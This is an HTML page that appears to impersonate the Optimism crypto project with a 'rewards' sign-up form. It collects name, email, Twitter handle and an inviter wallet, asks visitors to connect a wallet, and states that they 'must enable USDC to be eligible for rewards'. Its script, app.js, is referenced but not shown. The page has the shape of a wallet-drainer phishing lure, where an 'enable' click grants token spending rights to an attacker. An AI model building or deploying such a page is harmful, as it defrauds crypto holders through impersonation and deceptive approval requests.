<!DOCTYPE html>
<html lang="en">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <head>
    <link rel="shortcut icon" href="photos/optimism-ethereum-op-logo.png" type="image/png">
    <title>Optimism Form</title>
  </head>
  <body class="container" style="max-width: 600px; background: mistyrose; animation: show 2s;">
    <nav class="navbar navbar-default" style="margin-top: 15px; border-radius: 7px;">
      <div class="container-fluid">
          <h1 style="font-family: PantonNarrow-ExtraBoldItalic; color: #ff0423; font-size: 40px; margin-top: 13px; text-align: center;" href="#">
            OPTIMISM
          </h1>
      </div>
    </nav>
    <button id="shortAddress" class="button1">Connect Wallet</button>
    <form>
      <div class="form-group">
        <label for="exampleInputName">Name</label>
        <input type="text" class="form-control" id="exampleInputName" placeholder="James">
      </div>
      <div class="form-group">
        <label for="exampleInputEmail1">Email address</label>
        <input type="email" class="form-control" id="exampleInputEmail1" placeholder="james@gmail.com">
      </div>
      <label for="exampleInputTwitter">Twitter</label>
      <div class="input-group">
        <div class="input-group-addon">@</div>
        <input type="text" class="form-control" id="exampleInputTwitter" placeholder="JamesTwitter">
      </div>
      <div class="form-group">
        <label for="exampleInputInviterWallet" style="margin-top: 15px;">Inviter Wallet</label>
        <input type="text" class="form-control" id="exampleInputInviterWallet" placeholder="0x0000000000000000000000000000000000000000">
      </div>
    </form>
    <label for="Enable" style="margin-bottom: 15px;">You must enable USDC to be eligible for rewards</label>
    <button id="Enable" class="button1">Enable USDC</button>
    <button id="Submition" class="button1">Submit</button>

    <div class="socialmedia">
      <a target="_blank" href="https://discord.com/invite/rbrFnDuj"><img class="icons" src="photos/discord.png" alt=""></a>
      <a target="_blank" href="https://twitter.com/optimismFND"><img class="icons" src="photos/twitter.png" alt=""></a>
      <a target="_blank" href="https://github.com/ethereum-optimism/"><img class="icons" src="photos/github-sign.png" alt=""></a>
    </div>
  </body>
  <link href="style.css" rel="stylesheet" type="text/css">
  <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <script src="app.js"></script>
</html>
